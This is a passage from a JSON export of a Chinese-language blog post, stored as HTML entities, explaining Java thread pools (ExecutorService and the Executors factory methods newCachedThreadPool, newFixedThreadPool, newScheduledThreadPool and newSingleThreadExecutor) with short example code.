x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x662F;ExecutorService&#x3002;</p>\n<table>\n<thead>\n<tr>\n<th>&#x7C7B;&#x540D;</th>\n<th>&#x8BF4;&#x660E; </th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ExecutorService</td>\n<td>&#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x3002;</td>\n</tr>\n<tr>\n<td>ThreadPoolExecutor</td>\n<td>ExecutorService&#x7684;&#x9ED8;&#x8BA4;&#x5B9E;&#x73B0;&#x3002;</td>\n</tr>\n<tr>\n<td>ScheduledExecutorService</td>\n<td>&#x80FD;&#x548C;Timer/TimerTask&#x7C7B;&#x4F3C;&#xFF0C;&#x89E3;&#x51B3;&#x90A3;&#x4E9B;&#x9700;&#x8981;&#x4EFB;&#x52A1;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x95EE;&#x9898;&#x3002;</td>\n</tr>\n<tr>\n<td>ScheduledThreadPoolExecutor</td>\n<td>&#x7EE7;&#x627F;ThreadPoolExecutor&#x7684;ScheduledExecutorService&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x7684;&#x7C7B;&#x5B9E;&#x73B0;&#x3002;</td>\n</tr>\n</tbody>\n</table>\n<a id=\"more\"></a>\n<h3 id=\"&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"><a href=\"#&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\" class=\"headerlink\" title=\"&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"></a>&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;</h3><p><strong>&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5BF9;&#x4E8E;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x539F;&#x7406;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x914D;&#x7F6E;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x662F;&#x8F83;&#x4F18;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5728;Executors&#x7C7B;&#x91CC;&#x9762;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E9B;&#x9759;&#x6001;&#x5DE5;&#x5382;&#xFF0C;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x3002;</strong></p>\n<ul>\n<li>newCachedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;</li>\n<li>newFixedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;</li>\n<li>newScheduledThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002;</li>\n<li>newSingleThreadExecutor &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002;</li>\n</ul>\n<h4 id=\"1&#x3001;newCachedThreadPool\"><a href=\"#1&#x3001;newCachedThreadPool\" class=\"headerlink\" title=\"1&#x3001;newCachedThreadPool\"></a>1&#x3001;newCachedThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService cachedThreadPool = Executors.newCachedThreadPool();</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    try { </span><br><span class=\"line\">        Thread.sleep(index * 1000);</span><br><span class=\"line\">    } catch (InterruptedException e) {</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    cachedThreadPool.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            System.out.println(index);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x7EBF;&#x7A0B;&#x6C60;&#x4E3A;&#x65E0;&#x9650;&#x5927;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x7B2C;&#x4E8C;&#x4E2A;&#x4EFB;&#x52A1;&#x65F6;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#xFF0C;&#x4F1A;&#x590D;&#x7528;&#x6267;&#x884C;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x4E0D;&#x7528;&#x6BCF;&#x6B21;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x9700;&#x8981;&#x6267;&#x884C;&#x5F88;&#x591A;&#x77ED;&#x671F;&#x5F02;&#x6B65;&#x4EFB;&#x52A1;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x7A0B;&#x5E8F;&#x6027;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A;&#x957F;&#x65F6;&#x95F4;&#x4FDD;&#x6301;&#x7A7A;&#x95F2;&#x7684;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x4F1A;&#x5360;&#x7528;&#x4EFB;&#x4F55;&#x8D44;&#x6E90;&#xFF0C;&#x8C03;&#x7528;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5BF9;&#x8C61;&#x5C06;&#x91CD;&#x7528;&#x4EE5;&#x524D;&#x6784;&#x9020;&#x7684;&#x7EBF;&#x7A0B;&#xFF08;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x72B6;&#x6001;&#xFF09;&#xFF0C;&#x82E5;&#x7EBF;&#x7A0B;&#x6CA1;&#x6709;&#x53EF;&#x7528;&#x7684;&#xFF0C;&#x5219;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;&#x6DFB;&#x52A0;&#x5230;&#x6C60;&#x4E2D;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x7EC8;&#x6B62;&#x5E76;&#x4ECE;&#x6C60;&#x4E2D;&#x79FB;&#x9664;60&#x79D2;&#x672A;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x3002;</p>\n<h4 id=\"2&#x3001;newFixedThreadPool\"><a href=\"#2&#x3001;newFixedThreadPool\" class=\"headerlink\" title=\"2&#x3001;newFixedThreadPool\"></a>2&#x3001;newFixedThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    fixedThreadPool.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                System.out.println(index);</span><br><span class=\"line\">                Thread.sleep(2000);</span><br><span class=\"line\">            } catch (InterruptedException e) {</span><br><span class=\"line\">                // TODO Auto-generated catch block</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x56E0;&#x4E3A;&#x7EBF;&#x7A0B;&#x6C60;&#x5927;&#x5C0F;&#x4E3A;3&#xFF0C;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x8F93;&#x51FA;index&#x540E;sleep 2&#x79D2;&#xFF0C;<strong>&#x6240;&#x4EE5;&#x6BCF;&#x4E24;&#x79D2;&#x6253;&#x5370;3&#x4E2A;&#x6570;&#x5B57;</strong>&#x3002;<br>&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x5927;&#x5C0F;&#x6700;&#x597D;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002;&#x5982;Runtime.getRuntime().availableProcessors()&#x3002;&#x53EF;&#x53C2;&#x8003;PreloadDataCache&#x3002;</p>\n<h4 id=\"3&#x3001;newScheduledThreadPool\"><a href=\"#3&#x3001;newScheduledThreadPool\" class=\"headerlink\" title=\"3&#x3001;newScheduledThreadPool\"></a>3&#x3001;newScheduledThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002;<br>&#x5EF6;&#x8FDF;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);</span><br><span class=\"line\">scheduledThreadPool.schedule(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        System.out.println(&quot;delay 3 seconds&quot;);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}, 3, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>\n<p><strong>&#x8868;&#x793A;&#x5EF6;&#x8FDF;3&#x79D2;&#x6267;&#x884C;&#x3002;</strong></p>\n<p>&#x5B9A;&#x671F;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheduledThreadPool.scheduleAtFixedRate(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        System.out.println(&quot;delay 1 seconds, and excute every 3 seconds&quot;);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}, 1, 3, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x8868;&#x793A;&#x5EF6;&#x8FDF;1&#x79D2;&#x540E;&#x6BCF;3&#x79D2;&#x6267;&#x884C;&#x4E00;&#x6B21;</strong>&#x3002;<br>ScheduledExecutorService&#x6BD4;Timer&#x66F4;&#x5B89;&#x5168;&#xFF0C;&#x529F;&#x80FD;&#x66F4;&#x5F3A;&#x5927;&#x3002;<br>&#x53C2;&#x6570;5&#x6307;&#x7684;&#x662F;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x9700;&#x8981;&#x4FDD;&#x6301;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5373;&#x4FBF;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x90FD;&#x662F;&#x7A7A;&#x95F2;&#x7684;</p>\n<h4 id=\"4&#x3001;newSingleThreadExecutor\"><a href=\"#4&#x3001;newSingleThreadExecutor\" class=\"headerlink\" title=\"4&#x3001;newSingleThreadExecutor\"></a>4&#x3001;newSingleThreadExecutor</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    singleThreadExecutor.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                System.out.println(index);</span><br><span class=\"line\">                Thread.sleep(2000);</span><br><span class=\"line\">            } catch (InterruptedException e) {</span><br><span class=\"line\">                // TODO Auto-generated catch block</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x7ED3;&#x679C;&#x4F9D;&#x6B21;&#x8F93;&#x51FA;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x5404;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;<br>&#x73B0;&#x884C;&#x5927;&#x591A;&#x6570;GUI&#x7A0B;&#x5E8F;&#x90FD;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#x3002;Android&#x4E2D;&#x5355;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#xFF0C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5B89;&#x88C5;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5220;&#x9664;&#x7B49;&#x4E0D;&#x9002;&#x5408;&#x5E76;&#x53D1;&#x4F46;&#x53EF;&#x80FD;IO&#x963B;&#x585E;&#x6027;&#x53CA;&#x5F71;&#x54CD;UI&#x7EBF;&#x7A0B;&#x54CD;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>\n","excerpt":"<h3 id=\"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"><a href=\"#&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\" class=\"headerlink\" title=\"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;</h3><ul>\n<li>&#x51CF;&#x5C11;&#x4E86;&#x521B;&#x5EFA;&#x548C;&#x9500;&#x6BC1;&#x7EBF;&#x7A0B;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x590D;&#x5229;&#x7528;&#xFF0C;&#x53EF;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;</li>\n<li>&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7684;&#x627F;&#x53D7;&#x80FD;&#x529B;&#xFF0C;&#x8C03;&#x6574;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x5DE5;&#x4F5C;&#x7EBF;&#x7EBF;&#x7A0B;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9632;&#x6B62;&#x56E0;&#x4E3A;&#x6D88;&#x8017;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x628A;&#x670D;&#x52A1;&#x5668;&#x7D2F;&#x8DB4;&#x4E0B;(&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9700;&#x8981;&#x5927;&#x7EA6;1MB&#x5185;&#x5B58;&#xFF0C;&#x7EBF;&#x7A0B;&#x5F00;&#x7684;&#x8D8A;&#x591A;&#xFF0C;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;&#x4E5F;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;&#x6700;&#x540E;&#x6B7B;&#x673A;)&#x3002;</li>\n</ul>\n<p>Java&#x91CC;&#x9762;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x9876;&#x7EA7;&#x63A5;&#x53E3;&#x662F;Executor&#xFF0C;&#x4F46;&#x662F;&#x4E25;&#x683C;&#x610F;&#x4E49;&#x4E0A;&#x8BB2;Executor&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x7EBF;&#x7A0B;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x662F;ExecutorService&#x3002;</p>\n<table>\n<thead>\n<tr>\n<th>&#x7C7B;&#x540D;</th>\n<th>&#x8BF4;&#x660E; </th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ExecutorService</td>\n<td>&#x771F;&#x6B63;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x63A5;&#x53E3;&#x3002;</td>\n</tr>\n<tr>\n<td>ThreadPoolExecutor</td>\n<td>ExecutorService&#x7684;&#x9ED8;&#x8BA4;&#x5B9E;&#x73B0;&#x3002;</td>\n</tr>\n<tr>\n<td>ScheduledExecutorService</td>\n<td>&#x80FD;&#x548C;Timer/TimerTask&#x7C7B;&#x4F3C;&#xFF0C;&#x89E3;&#x51B3;&#x90A3;&#x4E9B;&#x9700;&#x8981;&#x4EFB;&#x52A1;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x95EE;&#x9898;&#x3002;</td>\n</tr>\n<tr>\n<td>ScheduledThreadPoolExecutor</td>\n<td>&#x7EE7;&#x627F;ThreadPoolExecutor&#x7684;ScheduledExecutorService&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x8C03;&#x5EA6;&#x7684;&#x7C7B;&#x5B9E;&#x73B0;&#x3002;</td>\n</tr>\n</tbody>\n</table>","more":"<h3 id=\"&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"><a href=\"#&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\" class=\"headerlink\" title=\"&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"></a>&#x5E38;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;</h3><p><strong>&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5BF9;&#x4E8E;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x539F;&#x7406;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x914D;&#x7F6E;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x662F;&#x8F83;&#x4F18;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5728;Executors&#x7C7B;&#x91CC;&#x9762;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E9B;&#x9759;&#x6001;&#x5DE5;&#x5382;&#xFF0C;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x3002;</strong></p>\n<ul>\n<li>newCachedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;</li>\n<li>newFixedThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;</li>\n<li>newScheduledThreadPool &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002;</li>\n<li>newSingleThreadExecutor &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002;</li>\n</ul>\n<h4 id=\"1&#x3001;newCachedThreadPool\"><a href=\"#1&#x3001;newCachedThreadPool\" class=\"headerlink\" title=\"1&#x3001;newCachedThreadPool\"></a>1&#x3001;newCachedThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EF;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x6C60;&#x957F;&#x5EA6;&#x8D85;&#x8FC7;&#x5904;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x7075;&#x6D3B;&#x56DE;&#x6536;&#x7A7A;&#x95F2;&#x7EBF;&#x7A0B;&#xFF0C;&#x82E5;&#x65E0;&#x53EF;&#x56DE;&#x6536;&#xFF0C;&#x5219;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 